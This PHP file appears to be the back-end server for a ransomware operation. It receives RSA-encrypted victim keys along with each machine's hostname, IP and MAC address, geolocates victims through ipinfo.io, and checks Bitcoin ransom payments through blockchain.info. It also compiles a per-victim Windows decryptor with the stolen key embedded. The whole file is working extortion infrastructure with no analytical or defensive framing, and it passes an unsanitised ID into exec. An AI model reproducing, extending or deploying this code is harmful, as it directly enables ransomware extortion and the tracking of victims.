
<?php

$request_method = $_SERVER["REQUEST_METHOD"];
// echo $request_method;

switch($request_method)
{
    case 'GET':
        $id = isset($_GET['id']) ? $_GET['id'] : NULL;
        require("./M/DB_key.php");
        if ($id && idExistDB($id))
        {
            require('./V/Paiement.php');
        }
        // else 404
    break;
    case 'POST':
        if (!empty($_POST["data"]))
        {
            $hexa = $_POST["data"];
            $data = hex2bin($hexa);

            $privateKey = openssl_get_privatekey("file://config/private.pem");
            $ret = openssl_private_decrypt($data, $decrypted, $privateKey, OPENSSL_PKCS1_PADDING);

            $json = json_decode($decrypted);
            if(!empty($json->Qkey))
            {
                $key = isset($json->key) ? $json->key : NULL;
                $hostname = isset($json->hostname) ? $json->hostname : NULL;
                $iv = isset($json->iv) ? $json->iv : NULL; 
                $PrivateIP = isset($json->PrivateIP) ? $json->PrivateIP : NULL;
                $mac = isset($json->mac) ? $json->mac : NULL;                                                     
                require("./M/DB_key.php");
                $id = getNewIdDB();
                $pub_ip = $_SERVER['REMOTE_ADDR'];
                $check = check_exist($pub_ip, $PrivateIP, $mac, $hostname);
                echo "id:" . getPublicKeyDB($id[0])[0] . "\n";
                echo "check:" . $check . "\n";
                if ($check == "FALSE")
                {
                    $infos = infos_from_ip($pub_ip);
                    $ret = saveKeyDB($id[0], $key, $iv, $pub_ip, $PrivateIP, $mac, $hostname, $infos);
                }
            }
        }
    break;
    default:
      header("HTTP/1.0 405 Method Not Allowed");
      break;
}

function infos_from_ip($ip)
{
    $details = json_decode(file_get_contents("http://ipinfo.io/" . $ip));
    $city = isset($details->city) ? $details->city : NULL;
    $region = isset($details->region) ? $details->region : NULL;
    $country = isset($details->country) ? $details->country : NULL;
    return Array($city, $region, $country);
}

function getPaiementAmount($id)
{
    $amount = file_get_contents("https://blockchain.info/q/addressbalance/" . $id);
    $amount /= 100000000;
    return $amount;
}

function generate_decryptor($id, $key, $iv)
{
    $file_data = "char *ENCODED_KEY = \"" . $key . "\";\n";
    $file_data .= "char *ENCODED_IV = \"" . $iv . "\";\n\n";
    $file_data .= file_get_contents('decryptor_src/decryptor.c');
    file_put_contents("decryptor_src/" . $id . '.c', $file_data);
    exec("i686-w64-mingw32-gcc decryptor_src/" . $id . ".c -Llib -static -l:libcrypto.a -lws2_32 -o decryptor/" . $id);
}

?>